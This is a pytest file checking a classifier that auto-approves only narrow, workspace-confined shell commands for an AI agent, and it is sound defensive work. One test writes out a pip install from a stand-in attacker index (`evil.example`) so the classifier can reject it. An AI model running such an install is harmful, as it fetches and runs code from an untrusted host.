"""Package A2, phase 2: workspace_selfservice.classify.

Each test goes through the public entry point `classify(cmd, workspace)`.
None = the existing gate decides as today; "auto" is allowed only for the
exact rated shapes confined to the given workspace.
"""

import delfin.agent.workspace_selfservice as ws


def _tmpdir(tmp_path):
    return str(tmp_path)


# --- S3: known tool --version (pure read, no write targets) -----------------

def test_version_of_known_tool_is_auto(tmp_path):
    assert ws.classify("gh --version", _tmpdir(tmp_path)) == "auto"
    assert ws.classify("git --version", _tmpdir(tmp_path)) == "auto"


def test_version_of_unknown_tool_is_none(tmp_path):
    assert ws.classify("jq --version", _tmpdir(tmp_path)) is None


def test_version_with_extra_words_is_none(tmp_path):
    assert ws.classify("gh --version --json", _tmpdir(tmp_path)) is None


def test_version_with_redirect_is_none(tmp_path, tmp_path_factory):
    out = tmp_path_factory.mktemp("out") / "v.txt"
    assert ws.classify(f"gh --version > {out}", _tmpdir(tmp_path)) is None


# --- S2: git switch to an own branch -----------------------------------------

def test_switch_to_new_own_branch_is_auto(tmp_path):
    assert ws.classify("git switch -c my-feature", _tmpdir(tmp_path)) == "auto"


def test_switch_to_plain_own_branch_is_auto(tmp_path):
    assert ws.classify("git switch my-feature", _tmpdir(tmp_path)) == "auto"


def test_switch_onto_main_is_none(tmp_path):
    assert ws.classify("git switch main", _tmpdir(tmp_path)) is None
    assert ws.classify("git switch master", _tmpdir(tmp_path)) is None


def test_switch_to_remote_tracking_is_none(tmp_path):
    assert ws.classify("git switch origin/main", _tmpdir(tmp_path)) is None


def test_switch_to_other_session_branch_is_none(tmp_path):
    assert ws.classify("git switch agent/s18-a1b", _tmpdir(tmp_path)) is None


def test_switch_with_start_point_is_none(tmp_path):
    assert ws.classify("git switch -c b origin/main", _tmpdir(tmp_path)) is None


# --- S1: pip install --require-hashes from an in-workspace venv --------------

def _make_venv(tmp_path):
    venv = tmp_path / ".venv"
    (venv / "bin").mkdir(parents=True)
    (tmp_path / "requirements.txt").write_text("numpy==1.26.4\n")
    return venv


def test_hashed_install_into_workspace_venv_is_auto(tmp_path):
    _make_venv(tmp_path)
    cmd = ".venv/bin/pip install -r requirements.txt --require-hashes"
    assert ws.classify(cmd, str(tmp_path)) == "auto"


def test_hashed_install_via_venv_python_is_auto(tmp_path):
    _make_venv(tmp_path)
    cmd = ".venv/bin/python -m pip install -r requirements.txt --require-hashes"
    assert ws.classify(cmd, str(tmp_path)) == "auto"


def test_install_without_hashes_is_none(tmp_path):
    _make_venv(tmp_path)
    cmd = ".venv/bin/pip install -r requirements.txt"
    assert ws.classify(cmd, str(tmp_path)) is None


def test_install_with_index_url_is_none(tmp_path):
    _make_venv(tmp_path)
    cmd = (".venv/bin/pip install -r requirements.txt --require-hashes "
           "--index-url http://evil.example/simple")
    assert ws.classify(cmd, str(tmp_path)) is None
    cmd2 = ".venv/bin/pip install -r requirements.txt --require-hashes -i x"
    assert ws.classify(cmd2, str(tmp_path)) is None


def test_install_editable_is_none(tmp_path):
    _make_venv(tmp_path)
    cmd = ".venv/bin/pip install -r requirements.txt --require-hashes -e ."
    assert ws.classify(cmd, str(tmp_path)) is None


def test_install_target_outside_workspace_is_none(tmp_path):
    # The venv and requirements are inside tmp_path; with an ABSOLUTE
    # workspace elsewhere, the pinned relative form would resolve inside
    # that workspace, so the escape must be shown with an absolute
    # interpreter path pointing at the original tmp_path.
    _make_venv(tmp_path)
    venv_pip = str(tmp_path / ".venv" / "bin" / "pip")
    cmd = f"{venv_pip} install -r requirements.txt --require-hashes"
    other = tmp_path / "other"
    other.mkdir()
    assert ws.classify(cmd, str(other)) is None


def test_install_req_outside_workspace_is_none(tmp_path):
    # Requirements file outside the given workspace (absolute).
    _make_venv(tmp_path)
    outside_req = tmp_path / "outside" / "requirements.txt"
    outside_req.parent.mkdir()
    outside_req.write_text("numpy==1.26.4\n")
    cmd = f".venv/bin/pip install -r {outside_req} --require-hashes"
    other = tmp_path / "other"
    other.mkdir()
    assert ws.classify(cmd, str(other)) is None


# --- unrated shapes / chain forms ---------------------------------------------

def test_chained_shape_is_none(tmp_path):
    _make_venv(tmp_path)
    cmd = "git switch -c b && gh --version"
    assert ws.classify(cmd, str(tmp_path)) is None


def test_piped_shape_is_none(tmp_path):
    assert ws.classify("gh --version | head", str(tmp_path)) is None


def test_env_assignment_is_none(tmp_path):
    assert ws.classify("FOO=1 gh --version", str(tmp_path)) is None


def test_empty_command_is_none(tmp_path):
    assert ws.classify("", str(tmp_path)) is None
